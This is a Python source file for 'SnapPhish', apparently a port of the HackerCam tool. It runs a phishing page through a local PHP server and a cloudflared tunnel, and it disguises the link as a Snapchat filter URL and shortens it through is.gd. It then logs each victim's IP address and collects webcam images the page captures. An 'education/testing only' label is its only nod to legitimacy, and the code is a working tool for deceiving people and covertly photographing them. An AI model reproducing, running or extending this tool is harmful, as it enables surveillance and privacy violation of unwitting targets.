# HackerCam Converted to Python (modified)
import os
import requests
import subprocess
import time
import shutil
import signal
from pathlib import Path
import re
from colorama import init as colorama_init, Fore, Style
import sys

def esc(s: str) -> str:
    return f"\x1b[{s}m"
# ========== CONFIGURATION ==========
GREEN = esc("38;5;1")  
BLUE = esc("38;5;12")
YELLOW = esc("38;5;11")
RED = esc("38;5;9")
MAGENTA = esc("38;5;13")
CYAN = esc("38;5;14")
WHITE = esc("38;5;15")

RESET = esc("0")
# ...existing code...
VERSION = "1.0"
PORT = 8080
FOL = os.path.expanduser("~/Downloads")
CWD = os.getcwd()
LOCAL_URL = f"127.0.0.1:{PORT}"
WEBSITE_PATH = os.path.expanduser("~/.website")
TUNNELER_DIR = os.path.expanduser("~/.tunneler")
TERMUX = os.path.exists("/data/data/com.termux")
REGION = False
SUBDOMAIN = False
CF_COMMAND = "cloudflared"
MASK = "https://snapchat-new-filter"  

# globals that menu may set
DIR = "snap"
selected_option = None


def install_cloudflared():
    """
    Download cloudflared into TUNNELER_DIR and make it executable.
    Returns path on success or None on failure.
    """
    arch = ""
    try:
        arch = subprocess.check_output(["uname", "-m"], text=True).strip()
    except Exception:
        arch = ""

    if arch in ("x86_64", "amd64"):
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    elif arch in ("aarch64", "arm64"):
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    else:
        print(f"[i] Unsupported architecture: {arch}")
        return None

    os.makedirs(TUNNELER_DIR, exist_ok=True)
    dest = os.path.join(TUNNELER_DIR, "cloudflared")
    try:
        print(f"[i] Downloading cloudflared for {arch}...")
        with requests.get(url, stream=True, timeout=30) as r:
            r.raise_for_status()
            with open(dest, "wb") as f:
                for chunk in r.iter_content(8192):
                    if chunk:
                        f.write(chunk)
        os.chmod(dest, 0o755)
        print(f"[+] cloudflared installed to {dest}")
        return dest
    except Exception as e:
        print(f"[!] Failed to download cloudflared: {e}")
        try:
            if os.path.exists(dest):
                os.remove(dest)
        except:
            pass
        return None

def ensure_cloudflared(auto_install=False):
    """
    Return a usable cloudflared path or None.
    If auto_install True will attempt to download into TUNNELER_DIR.
    """
    cf_path = shutil.which(CF_COMMAND) or os.path.join(TUNNELER_DIR, CF_COMMAND)
    if os.path.exists(cf_path) and os.access(cf_path, os.X_OK):
        return cf_path

    # not found; try default ~/.tunneler path explicitly
    candidate = os.path.join(TUNNELER_DIR, "cloudflared")
    if os.path.exists(candidate) and os.access(candidate, os.X_OK):
        return candidate

    if auto_install:
        return install_cloudflared()

    # interactive prompt (best-effort)
    try:
        ans = input("[i] cloudflared not found. Install it now into ~/.tunneler? [Y/n]: ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        return None
    if ans in ("", "y", "yes"):
        return install_cloudflared()
    return None
# ...existing code...



# ========== HELPERS ==========
def _sigint_handler(signum, frame):
    print("\nThank you !!.")
    # best-effort cleanup could be added here
    exit(0)

signal.signal(signal.SIGINT, _sigint_handler)

def netcheck():
    try:
        requests.get("https://google.com", timeout=3)
    except:
        print("[!] Internet not available!")
        exit(1)

def url_manager(link, disp_index=1, mask_index=2):
    """
    Print URLs similarly to the original shell function:
    - show header when disp_index == 1
    - print the real URL and a masked variant mask@host
    - if link appears to be from a tunneler, attempt to shorten via is.gd
    """
    global CF_COMMAND, MASK

    try:
        if disp_index == 1:
            print("\nYour urls are:\n")

        print(f"URL {disp_index} > {link}\n")

        # create masked form: mask@host (strip scheme)
        host = re.sub(r"^https?://", "", str(link)).rstrip("/")
        mask = MASK or "mask"
        print(f"URL {mask_index} > {mask}@{host}\n")

        # ensure internet before attempting shorten
        try:
            netcheck()
        except Exception:
            # netcheck will exit on failure in this script; keep safe fallback
            pass

        # decide whether to shorten (approximate shell behavior)
        shorten = False
        check_terms = [CF_COMMAND, "trycloudflare", "loclx"]
        for t in check_terms:
            if t and t in str(link):
                shorten = True
                break

        shortened = ""
        if shorten:
            try:
                resp = requests.get("https://is.gd/create.php", params={"format": "simple", "url": link}, timeout=6)
                if resp.status_code == 200 and resp.text.strip().startswith("https://"):
                    shortened = resp.text.strip()
            except Exception:
                shortened = ""

        if shortened:
            print(f"Shortened > {shortened}\n")
            short_host = re.sub(r"^https?://", "", shortened).rstrip("/")
            print(f"Masked > {mask}@{short_host}\n")

    except Exception as e:
        print(f"[i] url_manager error: {e}")
# ...existing code...

# New combined flow (php + tunnel + watcher) provided by user prompt
def start_php_and_tunnel_flow(option):
    """
    Starts PHP server, tunnelers (cloudflared/loclx if available), edits index.html
    for festival/youtube substitutions, parses logs for public links, and watches
    WEBSITE_PATH for ip.txt and log.txt.
    """
    global PORT, LOCAL_URL, WEBSITE_PATH, TUNNELER_DIR, CF_COMMAND, REGION, SUBDOMAIN, FOL, CWD

    def println(msg):
        print(msg)

    if TERMUX:
        println("\n[info] If you haven't enabled the hotspot, please do so now!")
        time.sleep(1.5)

    println(f"\n[info] Starting PHP server on localhost using port {PORT} [localhost:{PORT}]....\n")

    netcheck()

    # ensure website files are copied from selected template
    os.makedirs(WEBSITE_PATH, exist_ok=True)
    subprocess.run(["rm", "-rf", WEBSITE_PATH + "/*"])
    selected_template = os.path.join("websites", DIR)
    if os.path.isdir(selected_template):
        for file in os.listdir(selected_template):
            subprocess.run(["cp", "-r", os.path.join(selected_template, file), WEBSITE_PATH])
    else:
        println(f"[error] Template folder {selected_template} missing.")
        return

    # start php server
    try:
        php_cmd = ["php", "-S", LOCAL_URL, "-t", WEBSITE_PATH]
        php_proc = subprocess.Popen(php_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        println("[error] php executable not found. Make sure PHP is installed and in PATH.")
        return
    except Exception as e:
        println(f"[error] Failed to start php server: {e}")
        return

    # give php a moment and check
    time.sleep(2)
    try:
        r = requests.head(f"http://{LOCAL_URL}", timeout=5, allow_redirects=True)
        status = r.status_code
    except requests.RequestException:
        status = None

    if status is None:
        try:
            r = requests.get(f"http://{LOCAL_URL}", timeout=5)
            status = r.status_code
        except Exception:
            status = None

    if status and status < 400:
        println("[success] PHP has been successfully started and ready to use!\n")
    else:
        println("[error] PHP failed to respond correctly. Check PHP logs or port availability.")
        try:
            php_proc.terminate()
        except:
            pass
        return

    println("[info] Starting tunnelers......\n")

    # Prepare tunneler dir and logs
    os.makedirs(TUNNELER_DIR, exist_ok=True)
    cf_log = os.path.join(TUNNELER_DIR, "cf.log")
    loclx_log = os.path.join(TUNNELER_DIR, "loclx.log")
    for p in (cf_log):
        try:
            if os.path.exists(p):
                os.remove(p)
        except:
            pass

    netcheck()

    # construct args
    args_list = []
    if REGION and REGION is not False:
        args_list += ["--region", str(REGION)]
    if SUBDOMAIN and SUBDOMAIN is not False:
        args_list += ["--subdomain", str(SUBDOMAIN)]

    # find executables
    cf_path = shutil.which(CF_COMMAND) or os.path.join(TUNNELER_DIR, CF_COMMAND)
    started_any = False
    cf_proc = None
    loclx_proc = None

    # start cloudflared if available
    if os.path.exists(cf_path) and os.access(cf_path, os.X_OK):
        try:
            cf_out = open(cf_log, "w")
            cf_proc = subprocess.Popen([cf_path, "tunnel", "-url", f"http://{LOCAL_URL}"], stdout=cf_out, stderr=subprocess.STDOUT)
            started_any = True
        except Exception as e:
            println(f"[i] Failed to start cloudflared: {e}")
    else:
        println("[i] cloudflared not found; skipping Cloudflared tunnel. Install it or set CF_COMMAND to its path.")

    if not started_any:
        println("[!] No tunneler started. You can install cloudflared/loclx or run your own tunnel and paste the link manually.")

    # give tunnelers time to emit links
    time.sleep(5)

    # cd into website dir
    try:
        os.chdir(WEBSITE_PATH)
    except Exception as e:
        println(f"[i] Could not change to website directory: {e}")

    # edit index.html for festival or youtube id substitutions
    try:
        idx_path = os.path.join(WEBSITE_PATH, "index.html")
        if os.path.exists(idx_path):
            with open(idx_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            modified = False
    except Exception as e:
        println(f"[i] index.html modification failed: {e}")

    # attempt to parse logs and extract links
    cflink = None
    loclxlink = None

    def read_file_tail(path):
        try:
            with open(path, "r", errors="ignore") as f:
                return f.read()
        except Exception:
            return ""

    # Poll logs for up to ~10 seconds each
    for _ in range(10):
        if os.path.exists(cf_log):
            txt = read_file_tail(cf_log)
            m = re.search(r"https?://[a-z0-9-]+\.trycloudflare\.com", txt, re.IGNORECASE)
            if m:
                if SUBDOMAIN:
                    cflink = f"https://{SUBDOMAIN}.trycloudflare.com"
                else:
                    cflink = m.group(0)
                # use the actual link cloudflared created
                cflink = m.group(0)
                # if the user configured SUBDOMAIN, warn that it's only cosmetic
                if SUBDOMAIN and SUBDOMAIN not in cflink:
                    println(f"[i] Note: requested SUBDOMAIN '{SUBDOMAIN}' is not assigned by cloudflared. Showing actual: {cflink}")

                    break
        time.sleep(1)

    
    cfcheck = bool(cflink)

    try:
        if cfcheck and True:
            println("[success] Cloudflared has started successfully!\n")
            try:
                url_manager(cflink, 1, 2)
            except Exception:
                println("[i] url_manager not available.") 
        else:
            println(f"[error] Tunneling failed! Start your own port forwarding/tunneling service at port {PORT}\n")
    except Exception as e:
        println(f"[i] Error while handling url_manager: {e}")

    time.sleep(1)
    # clear any old ip.txt in original working dir
    try:
        ip_dest = os.path.join(CWD, "ip.txt")
        if os.path.exists(ip_dest):
            os.remove(ip_dest)
    except Exception:
        pass
# ...existing code...
    println(f"[info] Waiting for the next step... Press Ctrl + C to exit\n")

    # watch loop - watches files in WEBSITE_PATH (we chdir-ed)
    try:
        processed_ips = set()            # <--- added: remember processed lines to avoid duplicates
        while True:
            # ip.txt
            if os.path.exists("ip.txt"):
                # read and normalize lines
                with open("ip.txt", "r", errors="ignore") as f:
                    lines = [l.strip() for l in f if l.strip()]

                # only keep lines we haven't already processed
                new_lines = [l for l in lines if l not in processed_ips]

                if new_lines:
                    print("\a[success] The target opened the link!\n")
                    for line in new_lines:
                        print(f"[x] :: {line}")
                        processed_ips.add(line)

                    # append only new lines to CWD/ip.txt
                    try:
                        out_path = os.path.join(CWD, "ip.txt")
                        os.makedirs(os.path.dirname(out_path), exist_ok=True)
                        with open(out_path, "a") as out:
                            out.write("\n".join(new_lines) + ("\n" if new_lines else ""))
                    except Exception as e:
                        println(f"[i] Could not append ip.txt to {CWD}/ip.txt: {e}")

                # remove the transient ip.txt produced by the webroot handler
                try:
                    os.remove("ip.txt")
                except:
                    pass

            # log.txt => image downloaded
            if os.path.exists("log.txt"):
                print("\a[success] Image downloaded! Check directory!\n")
                png_files = [f for f in os.listdir(".") if f.lower().endswith(".png")]
                for file in png_files:
                    try:
                        shutil.move(os.path.join(".", file), os.path.expanduser(FOL))
                        println(f"[i] Moved {file} -> {FOL}")
                    except Exception as e:
                        println(f"[i] Could not move {file} to {FOL}: {e}")
                try:
                    os.remove("log.txt")
                except:
                    pass

            time.sleep(0.5)
    except KeyboardInterrupt:
# ...existing code...
        println("\n[i] Exiting watch loop (Ctrl+C pressed).")
        # try to terminate started subprocesses
        try:
            if cf_proc and cf_proc.poll() is None:
                cf_proc.terminate()
        except:
            pass
        try:
            if php_proc and php_proc.poll() is None:
                php_proc.terminate()
        except:
            pass
        return
def esc(s): return f"\x1b[{s}m"
RESET = esc("0")


# ========== MAIN PROGRAM ==========
def update_local_url():
    global LOCAL_URL
    LOCAL_URL = f"127.0.0.1:{PORT}"

def main_menu():
    global FOL, PORT, DIR, selected_option

    update_local_url()
    while True:
        os.system("clear" if os.name != "nt" else "cls")
        print(f"{GREEN}||======╗ ||\\    ||    //\\\\    ||======╗     ⠀⢀⣀⣤⣤⣤⣤⣄⡀⠀     {RESET}  ")
        print(f"{BLUE}||        ||\\\\   ||   //  \\\\   ||      ]   ⢀⣤⣾⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀  {RESET}  ")
        print(f"{YELLOW}||        || \\\\  ||  //====\\\\  ||      ]  ⢠⣾⣿⢛⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀  {RESET}  ")
        print(f"{RED}||======╗ ||  \\\\ || //      \\\\ ||======╝  ⣿⡿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⢿⡵  {RESET} ") 
        print(f"{GREEN}       || ||   \\\\||            ||         ⢸⡇⠀⠀⠉⠛⠛⣿⣿⠛⠛⠉⠀⠀⣿⡇  {RESET}") 
        print(f"{GREEN}       || ||    \\||            ||         ⢸⣿⣀⠀⢀⣠⣴⡇⠹⣦⣄⡀⠀⣠⣿⡇  {RESET}") 
        print(f"{GREEN}||======╝ ||     ||            ||         ⠈⠻⠿⠿⣟⣿⣿⣦⣤⣼⣿⣿⠿⠿⠟⠀  {RESET}")
        print(f"{GREEN}                     [SnapPhish]              ⠸⡿⣿⣿⢿⡿⢿⠇⠀⠀    {RESET} ")
        print(f"{GREEN}                   [PC+programmer]              ⠈⠁⠈⠁⠀       {RESET}  ")        
        print(f"{BLUE}Please select an option:\n{RESET}")
        print(f"{BLUE}[{RESET}{WHITE}1{RESET}{BLUE}] Start snaphish{RESET}")
        print(f"{BLUE}[{RESET}{WHITE}2{RESET}{BLUE}] Change the default port (current: {PORT}){RESET}")
        print(f"{BLUE}[{RESET}{WHITE}3{RESET}{BLUE}] Change the image directory (current: {FOL}){RESET}")
        print(f"{BLUE}[{RESET}{WHITE}4{RESET}{BLUE}] Credits{RESET}")
        print(f"{BLUE}[{RESET}{WHITE}0{RESET}{BLUE}] Exit\n{RESET}")

        try:
            option = input("[Snaphish]㉿>>$ ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\nThank you !!.")
            exit(0)

        if option == "1":
            DIR = "snap"
            selected_option = "1"
            break
        elif option.lower() == "2":
            pore = input("Please enter the port: ").strip()
            if pore.isdigit() and 1 <= int(pore) <= 65535:
                PORT = int(pore)
                update_local_url()
                print(f"\n[+] Port changed to {PORT} successfully!\n")
            else:
                print("\n[!] Invalid port. Enter a number between 1 and 65535.\n")
            time.sleep(1.2)
        elif option.lower() == "3":
            dire = input("Please enter the directory: ").strip()
            if not dire:
                print("\n[!] No directory entered.\n")
            elif not os.path.isdir(os.path.expanduser(dire)):
                print("\n[!] The specified directory is invalid and cannot be used!\n")
            else:
                FOL = os.path.expanduser(dire)
                print("\n[+] Directory changed successfully!\n")
            time.sleep(1.2)
        elif option.lower() == "4":
            print("\nTool: Snaphish\nVersion: " + VERSION)
            print("Description: Access behavior demo (for education/testing only)")
            print("Author: PC+programmer")
            input("Press Enter to return to menu...")
        # elif option.lower() == "5":
        #     print("\nOpening project page in browser...")
        #     try:
        #         webbrowser.open("https://github.com/PCprogrammer67/SnapPhish")
        #     except Exception:
        #         print("[!] Could not open browser.")
        #     time.sleep(1.2)
        elif option == "0":
            print("\nThank you for using Snaphish! [Exiting] .\n")
            exit(0)
        else:
            print("\n[!] Input is invalid, please try again.\n")
            time.sleep(1)

if __name__ == "__main__":
    try:
        # unzip_websites()          
        main_menu()
        start_php_and_tunnel_flow(selected_option)
    except KeyboardInterrupt:
        print("\nThank you !!.")
        exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        exit(1)

